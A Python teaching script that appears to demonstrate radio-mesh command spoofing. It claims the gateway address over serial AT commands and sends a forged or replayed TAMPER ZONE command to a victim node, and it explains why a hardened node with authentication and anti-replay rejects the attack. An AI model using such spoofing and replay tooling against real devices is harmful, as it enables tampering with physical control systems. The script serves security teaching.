#!/usr/bin/env python3
"""Inject a forged TAMPER ZONE into a node to teach authentication.

Spoof.py is the classroom data-injection demonstration. It claims the
mesh gateway address on the physical transceiver and transmits a crafted
ZONE command to the victim node. Against the naive node the forged
command moved the latch; against the hardened node the same attack fails
twice over. The envelope cannot be authenticated because the spoofing
tool holds no field key, and even a captured command that did
authenticate would be rejected by the monotonic anti-replay window.
"""

import argparse
import secrets
import sys
import time

import field_crypto

try:
    import serial
except ImportError as exc:
    raise SystemExit(
        "pip install pyserial to run the TAMPER spoof tool"
    ) from exc

GATEWAY_ADDRESS = "0001"
NONCE_LEN = 24
TAG_LEN = 16
KEY_LEN = 32
TAMPER_COMMAND_ARM = 1
DEFAULT_ZONE = 4


def _parse_args():
    """Parse spoof tool command-line arguments.

    Parameters
    ----------
    None

    Returns
    -------
    argparse.Namespace
        Parsed spoof tool arguments.
    """
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--port", required=True, help="Serial port device")
    parser.add_argument("--baud", type=int, default=115200,
                        help="Radio baud rate")
    _add_forge_args(parser)
    return parser.parse_args()


def _add_forge_args(parser):
    """Add the forged zone and attack-mode options.

    Parameters
    ----------
    parser : argparse.ArgumentParser
        Parser receiving the forged field options.

    Returns
    -------
    None
    """
    parser.add_argument("--victim", required=True,
                        help="Victim node address in hex")
    parser.add_argument("--seq", type=int, default=1,
                        help="Forged command sequence number")
    parser.add_argument("--zone", type=int, default=DEFAULT_ZONE,
                        help="Forged zone in tenths of a degree Celsius")
    parser.add_argument("--mode", choices=("bad-tag", "replay"),
                        default="bad-tag",
                        help="Forged sealed command or captured replay")
    parser.add_argument("--capture",
                        help="Captured hex command to replay in replay mode")


def _le32(value):
    """Encode an integer as four little-endian bytes.

    Parameters
    ----------
    value : int
        Unsigned value to encode.

    Returns
    -------
    bytes
        Four little-endian bytes.
    """
    return value.to_bytes(4, "little")


def _command_body(seq, zone):
    """Build a forged ZONE body of sequence, value, and random tag.

    Parameters
    ----------
    seq : int
        Forged command sequence number.
    zone : int
        Forged zone in tenths of a degree Celsius.

    Returns
    -------
    bytes
        Twenty-three byte forged command body.
    """
    head = _le32(seq) + bytes([TAMPER_COMMAND_ARM])
    return head + zone.to_bytes(2, "little") + secrets.token_bytes(TAG_LEN)


def _forged_envelope(body):
    """Wrap a forged body in a plausible but unauthenticated envelope.

    Parameters
    ----------
    body : bytes
        Forged command body.

    Returns
    -------
    str
        Lowercase hex nonce, ciphertext, and random tag bytes.
    """
    key = secrets.token_bytes(KEY_LEN)
    nonce = secrets.token_bytes(NONCE_LEN)
    ct, tag = field_crypto._xchacha_seal(key, nonce, field_crypto.FIELD_AD,
                                         body)
    return (nonce + ct + tag).hex()


def _set_spoof_address(ser, address):
    """Claim an address on the local transceiver.

    Parameters
    ----------
    ser : serial.Serial
        Open radio serial connection.
    address : str
        Address to claim in hex.

    Returns
    -------
    None
    """
    cmd = f"AT+ADDRESS={int(address, 16)}\r\n".encode("utf-8")
    ser.write(cmd)
    ser.flush()


def _send_spoof(ser, victim, payload):
    """Transmit the forged command to the victim node.

    Parameters
    ----------
    ser : serial.Serial
        Open radio serial connection.
    victim : str
        Victim node address in hex.
    payload : str
        Forged frame text, either a broken envelope or a replay.

    Returns
    -------
    None
    """
    cmd = f"AT+SEND={victim},{len(payload)},{payload}\r\n"
    ser.write(cmd.encode("utf-8"))
    ser.flush()


def _frame(args):
    """Build the forged wire frame for the selected attack mode.

    Parameters
    ----------
    args : argparse.Namespace
        Parsed spoof tool arguments.

    Returns
    -------
    str
        Forged frame text sent to the victim node.
    """
    if args.mode == "replay":
        return args.capture or ""
    return _forged_envelope(_command_body(args.seq, args.zone))


def main():
    """Inject the forged TAMPER ZONE under the gateway address.

    Parameters
    ----------
    None

    Returns
    -------
    int
        Zero on successful injection.
    """
    args = _parse_args()
    frame = _frame(args)
    with serial.Serial(args.port, args.baud, timeout=1.0) as ser:
        _set_spoof_address(ser, GATEWAY_ADDRESS)
        time.sleep(0.2)
        _send_spoof(ser, args.victim, frame)
    print(f"Injected forged {args.mode} zone {args.zone} to node "
          f"0x{args.victim}")
    print("The node rejects it because the spoof tool holds no field key "
          "and cannot seal a valid envelope.")
    print("A captured command that did authenticate is still refused by the "
          "monotonic anti-replay window.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
